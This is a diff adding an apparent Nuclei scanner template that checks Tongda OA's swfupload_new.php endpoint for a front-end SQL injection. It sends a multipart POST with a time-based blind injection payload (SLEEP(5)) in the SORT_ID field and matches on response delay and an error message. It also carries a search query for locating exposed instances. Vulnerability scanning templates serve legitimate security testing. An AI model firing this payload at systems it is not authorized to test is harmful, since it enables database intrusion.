@@ -1,0 +1,51 @@
+id: tongda_oa_swfupload_new_sqli
+
+info:
+  name: tongda_oa_swfupload_new_sqli
+  author: Xc1Ym
+  severity: high
+  description: 通达OA swfupload_new存在前台SQL注入漏洞,攻击者通过漏洞可以获取数据库信息。
+  metadata:
+    max-request: 1
+    hunter-query: app.name="通达 OA"
+    verified: true
+  tags: sqli,oa,tongda,hw
+
+http:
+  - raw:
+      - |
+        @timeout: 7s
+        POST /general/file_folder/swfupload_new.php HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
+        Content-Length: 355
+        Content-Type: multipart/form-data; boundary=----------GFioQpMK0vv2
+        Accept-Encoding: gzip
+
+        ------------GFioQpMK0vv2
+        Content-Disposition: form-data; name="ATTACHMENT_ID"
+
+        1
+        ------------GFioQpMK0vv2
+        Content-Disposition: form-data; name="ATTACHMENT_NAME"
+
+        1
+        ------------GFioQpMK0vv2
+        Content-Disposition: form-data; name="FILE_SORT"
+
+        2
+        ------------GFioQpMK0vv2
+        Content-Disposition: form-data; name="SORT_ID"
+
+        -@`'`  AND (SELECT 3397 FROM (SELECT(SLEEP(5)))jCdN)
+        ------------GFioQpMK0vv2--
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code==200
+          - duration>=5
+          - contains(body, '错误，请联系管理员')
+        condition: and
+      
+# digest: 4b0a00483046022100a1c187fa8f5915100dbe1f2227da2abbc0b44d48cc1a3c4d80b928ea577d41a2022100aa7a6a32c89eaa01607f905220bcb46b154cd0fc1df60564db412a2327fd1e90:6b2dd5af372f02ed15a56faf8ad98cf9
